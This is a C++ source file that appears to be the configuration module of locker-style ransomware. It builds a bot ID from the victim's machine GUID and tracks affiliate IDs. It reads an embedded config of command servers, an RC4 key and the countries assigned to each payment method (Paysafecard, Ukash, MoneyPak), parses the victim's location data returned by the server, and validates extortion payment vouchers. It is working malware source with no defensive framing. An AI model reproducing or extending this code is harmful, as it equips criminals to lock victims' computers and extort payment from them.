#include "..\..\..\..\loader\mod_launcher\code\zshellcode.h"

zgui_ImplementSingleton (LockerConfig)

#ifdef SIMPLE_MODE
extern uint32_t gAffId;
extern uint32_t gSubId;
#else
extern dll_block_t gDllBlock;
#endif // SIMPLE_MODE


int utils_is_wow64(HANDLE ProcessHandle)
{
    BOOL bIsWow64 = FALSE;
    typedef BOOL (WINAPI *FnIsWow64Process)(HANDLE, PBOOL);
    FnIsWow64Process fnIsWow64Process;

    fnIsWow64Process = (FnIsWow64Process)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
    if (NULL != fnIsWow64Process) {
        fnIsWow64Process(ProcessHandle, &bIsWow64);
    }

    return bIsWow64 ? 1 : 0;
}

LONG RegReadValue(HKEY RootKeyHandle, PCHAR SubKeyName, PCHAR ValueName, DWORD Type, PVOID Buffer, DWORD Len)
{
    HKEY KeyHandle;
    LONG ErrorCode;

    ErrorCode = RegOpenKeyExA(RootKeyHandle, SubKeyName, 0, KEY_QUERY_VALUE|KEY_WOW64_64KEY, &KeyHandle);
    if (ErrorCode == ERROR_SUCCESS) {
        ErrorCode = RegQueryValueExA(KeyHandle, ValueName, 0, &Type, (LPBYTE)Buffer, &Len);
        RegCloseKey(KeyHandle);
    }

    return ErrorCode;

}

LockerConfig::LockerConfig() :
currentServer(0),
botIp("-"),
botCountry("-"),
botCity("-"),
botISP("-"),
_keylen(0),
waitTimeout(25 * 60 * 1000),
activeVoucherStatus(Uninitialized)
{
    int i;
    OSVERSIONINFOEXA osver;
    char machineGuid[MAX_PATH];

    memset((uint8_t*)_key, 0, sizeof(_key));
    memset((uint8_t*)machineGuid, 0, sizeof(machineGuid));
    memset((uint8_t*)&osver, 0, sizeof(OSVERSIONINFOEXA));

    osver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    GetVersionExA((OSVERSIONINFOA*)&osver);

    osMajorVer = osver.dwMajorVersion;
    osMinorVer = osver.dwMinorVersion;
    osSp = (uint32_t)osver.wServicePackMajor;
    osBuildNumber = osver.dwBuildNumber;
    osProductType = (uint32_t)osver.wProductType;
    osIs64 = utils_is_wow64(INVALID_HANDLE_VALUE);

    sysLangId = 0x0409; // US
    uint32_t lid;
    if (GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_ILANGUAGE | LOCALE_RETURN_NUMBER/*LOCALE_SISO639LANGNAME*/, (LPTSTR)&lid, sizeof(lid)) > 0) {
        sysLangId = lid;
    }

//     sysCountry = "US"; // US
//     TCHAR buffer [256] = { 0 };
//     if (GetLocaleInfo(LANG_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, buffer, sizeof(buffer)) > 0) {
//         sysCountry = buffer;
//     }

// #ifdef LOCKER_DLL_MODE
// #else

    if (RegReadValue(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Cryptography", "MachineGuid", REG_SZ, machineGuid, sizeof(machineGuid)) != ERROR_SUCCESS) {
        ULONG seed = GetTickCount();

        // Генерируем случайное имя.
        for (i = 0; i < 64; ++i) {
            machineGuid[i] = 65 + (RtlRandomEx(&seed) % 26);
        }
    }

    for (i = 0; i < 64; ++i) {
        if (machineGuid[i] == '{') {
            machineGuid[i] = '7';
        }
        else if (machineGuid[i] == '}') {
            machineGuid[i] = '9';
        }
        else if (machineGuid[i] == '-') {
            machineGuid[i] = '4';
        }
    }
    machineGuid[64] = '\0';

    botId = machineGuid;

    int initialStart = botId.length();
    for (i = initialStart; i < 64; ++i) {
        botId << botId[i - initialStart];
    }

#ifdef SIMPLE_MODE
    affId = gAffId;
    subId = gSubId;
    //::MessageBox(NULL, botId.toWideCharPointer(), L"OK", MB_OK);
#else
//     botId = zgui::String((char*)gExeBlock.botId, sizeof(gExeBlock.botId));
    affId = gDllBlock.affId;
    subId = gDllBlock.subId;
#endif // SIMPLE_MODE

//     botId = "d63107441123733377ff532b9d3484ddaaf62280dfcfd5059f8a7773d011b778";
//     affId = 1;
//     subId = 1;
    // #endif // _DEBUG
}

LockerConfig::~LockerConfig()
{

}

bool LockerConfig::loadConfig()
{
    bool ret = true;
    // Считываем конфиг.
    zgui::String sConfig;
    zgui::MemoryBlock cfgBuffer;

    if (!zgui::Resources::getInstance()->getBinary("config", cfgBuffer)) {
        return false;
    }

    sConfig = zgui::String::createStringFromData(cfgBuffer.getData(), cfgBuffer.getSize());

    zgui::StringArray lines;
    lines.addLines(sConfig);
    lines.trim();

    for (int i = 0; i < lines.size(); ++i) {
        zgui::StringArray parts;
        parts.addTokens(lines[i], "=", "\"");
        parts.trim();

        zgui::String key = parts[0];
        zgui::String val = parts[1];

        if (key == "servers") {
            servers.addTokens(val, ";", zgui::String::empty);
            servers.trim();
            if (servers.size() == 0) {
                ret = false;
                break;
            }
        }
        else if (key == "key") {
            val.copyToUTF8(_key, 64);
            _keylen = val.length();
        }
        else if (key == "psc") {
            pscCountries.addTokens(val, ",", zgui::String::empty);
            pscCountries.trim();
        }
        else if (key == "ukash") {
            ukashCountries.addTokens(val, ",", zgui::String::empty);
            ukashCountries.trim();
        }
        else if (key == "mpak") {
            mpakCountries.addTokens(val, ",", zgui::String::empty);
            mpakCountries.trim();
        }
        else if (key == "dollar") {
            dollarCountries.addTokens(val, ",", zgui::String::empty);
            dollarCountries.trim();
        }
        else if (key == "euro") {
            euroCountries.addTokens(val, ",", zgui::String::empty);
            euroCountries.trim();
        }
        else if (key == "pound") {
            poundCountries.addTokens(val, ",", zgui::String::empty);
            poundCountries.trim();
        }
    }

    return ret;
}

void LockerConfig::arc4_crypt_self(uint8_t* buffer, uint32_t length/*, const uint8_t* key, */)
{
    uint32_t i, j = 0, k = 0;
    int a, b;
    uint8_t m[256];

    for (i = 0; i < 256; i++) {
        m[i] = (uint8_t)i;
    }

    for (i = 0; i < 256; i++, k++) {
        if (k >= _keylen) {
            k = 0;
        }

        a = m[i];
        j = (j + a + _key[k]) & 0xFF;
        m[i] = m[j];
        m[j] = (uint8_t)a;
    }

    k = j = 0;

    for (i = 0; i < length; ++i) {
        k = (k + 1) & 0xFF;
        a = m[k];
        j = (j + a) & 0xFF;
        b = m[j];

        m[k] = (uint8_t)b;
        m[j] = (uint8_t)a;

        buffer[i] = (uint8_t)(buffer[i] ^ m[(uint8_t)(a + b)]);
    }
}

bool LockerConfig::parseNodeParams(const zgui::String& params)
{
    zgui::StringArray arr;
    arr.addTokens(params, ";", zgui::String::empty);
    arr.trim();
    if (arr.size() < 6) {
        return false;
    }

    botIp = arr[0];
    botCountry = arr[1];
    botCountryCode = arr[2];
    botCity = arr[3];
    botISP = arr[4];
    botOrg = arr[5];

    return true;
}

bool LockerConfig::parseVoucherStatus(const zgui::String& vStatus)
{
    zgui::StringArray arr;
    arr.addTokens(vStatus, ";", zgui::String::empty);
    arr.trim();
    if (arr.size() != 2) {
        return false;
    }

    activeVoucherStatus = arr[0].getIntValue();
    waitTimeout = (uint32_t)arr[1].getLargeIntValue();
    waitTimeout *= 60 * 1000;

    return true;
}

bool LockerConfig::parseVouchersInfo(const zgui::String& vInfos)
{
    zgui::StringArray arr;
    arr.addTokens(vInfos, ";", zgui::String::empty);
    arr.trim();

    _badVouchers.clear();

    waitTimeout = (uint32_t)arr[0].getLargeIntValue();
    waitTimeout *= 60 * 1000;

    int sz = arr.size();

    for (int i = 1; i < sz; ++i) {
        zgui::StringArray vInfo;
        vInfo.addTokens(arr[i], ":", zgui::String::empty);
        if (vInfo.size() == 3) {
            _badVouchers.add(vInfo[0]);
            _badVoucherTypes.add(vInfo[2].getIntValue());
            if (i == (sz - 1)) {
                activeVoucherStatus = vInfo[1].getIntValue();
            }
        }
    }

    return true;
}


bool LockerConfig::checkAndPrepareVoucher(const zgui::String& voucherNum, int voucherType)
{
    if (_badVouchers.contains(voucherNum)) {
        return false;
    }
    activeVoucher = voucherNum;
    activeVoucherType = voucherType;

    return true;
}

void LockerConfig::addVoucherAsUsed(const zgui::String& voucherNum)
{
    if (!_badVouchers.contains(voucherNum)) {
        _badVouchers.add(voucherNum);
    }
}
